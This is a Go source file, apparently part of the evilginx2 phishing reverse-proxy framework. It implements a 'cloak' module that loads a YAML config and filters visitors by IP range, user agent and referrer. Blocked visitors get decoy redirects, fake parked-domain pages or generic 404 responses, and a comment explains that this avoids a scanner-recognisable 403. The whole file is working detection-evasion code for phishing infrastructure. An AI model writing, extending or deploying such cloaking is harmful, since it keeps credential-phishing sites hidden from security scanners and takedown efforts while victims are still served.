package core

import (
	"net"
	"net/http"
	"os"
	"path/filepath"
	"strings"

	"github.com/elazarl/goproxy"
	"github.com/kgretzky/evilginx2/log"
	"gopkg.in/yaml.v2"
)

type CloakDecoy struct {
	Mode        string `yaml:"mode"`
	RedirectURL string `yaml:"redirect_url"`
}

type CloakConfig struct {
	Enabled            bool       `yaml:"enabled"`
	BlockedCIDRs       []string   `yaml:"blocked_cidrs"`
	BlockedUA          []string   `yaml:"blocked_ua"`
	RequireReferrer    bool       `yaml:"require_referrer"`
	AllowedRefPrefixes []string   `yaml:"allowed_referrer_prefixes"`
	Decoy              CloakDecoy `yaml:"decoy"`
}

type Cloak struct {
	cfg      CloakConfig
	cidrs    []*net.IPNet
	decoyURL string
}

// NewCloak loads ~/.evilginx/cloak.yaml. Returns nil if the file is
// missing, unreadable, or has enabled: false.
func NewCloak() *Cloak {
	home, err := os.UserHomeDir()
	if err != nil {
		return nil
	}
	path := filepath.Join(home, HOME_DIR, "cloak.yaml")
	raw, err := os.ReadFile(path)
	if err != nil {
		return nil
	}
	var cfg CloakConfig
	if err := yaml.Unmarshal(raw, &cfg); err != nil {
		log.Error("cloak: parse %s: %v", path, err)
		return nil
	}
	if !cfg.Enabled {
		return nil
	}
	c := &Cloak{cfg: cfg}
	for _, s := range cfg.BlockedCIDRs {
		if _, n, err := net.ParseCIDR(s); err == nil {
			c.cidrs = append(c.cidrs, n)
		} else {
			log.Warning("cloak: invalid CIDR %q", s)
		}
	}
	if cfg.Decoy.Mode == "" {
		c.cfg.Decoy.Mode = "404"
	}
	c.decoyURL = cfg.Decoy.RedirectURL
	log.Info("cloak: enabled (%d CIDRs, %d UA rules, decoy=%s)",
		len(c.cidrs), len(cfg.BlockedUA), c.cfg.Decoy.Mode)
	return c
}

// Evaluate returns nil if the request passes, otherwise a decoy response.
func (c *Cloak) Evaluate(req *http.Request, clientIP string) *http.Response {
	ip := net.ParseIP(clientIP)
	if ip == nil {
		return c.decoy(req)
	}
	for _, n := range c.cidrs {
		if n.Contains(ip) {
			log.Debug("cloak: CIDR block %s", clientIP)
			return c.decoy(req)
		}
	}
	ua := strings.ToLower(req.UserAgent())
	for _, s := range c.cfg.BlockedUA {
		if s == "" {
			continue
		}
		if strings.Contains(ua, strings.ToLower(s)) {
			log.Debug("cloak: UA block %s (%s)", clientIP, ua)
			return c.decoy(req)
		}
	}
	if c.cfg.RequireReferrer && req.Method == "GET" {
		ref := req.Header.Get("Referer")
		ok := false
		for _, p := range c.cfg.AllowedRefPrefixes {
			if strings.HasPrefix(ref, p) {
				ok = true
				break
			}
		}
		if !ok {
			log.Debug("cloak: referrer rejected from %s (%s)", clientIP, ref)
			return c.decoy(req)
		}
	}
	return nil
}

func (c *Cloak) decoy(req *http.Request) *http.Response {
	switch c.cfg.Decoy.Mode {
	case "redirect":
		resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
		resp.Header.Set("Location", c.decoyURL)
		return resp
	case "parked":
		body := `<!DOCTYPE html><html><head><title>Welcome</title></head><body><h1>This domain is parked</h1><p>This domain has been registered but no site is configured.</p></body></html>`
		return goproxy.NewResponse(req, "text/html; charset=UTF-8", http.StatusOK, body)
	default:
		return decoy404(req)
	}
}

// decoy404 is the shared "not found" page used by cloak and by the
// protected-page handler for failed tokens. Never returns a 403 with a
// plain "Forbidden" body — that shape is a scanner fingerprint.
func decoy404(req *http.Request) *http.Response {
	body := `<!DOCTYPE html><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this server.</p></body></html>`
	return goproxy.NewResponse(req, "text/html; charset=UTF-8", http.StatusNotFound, body)
}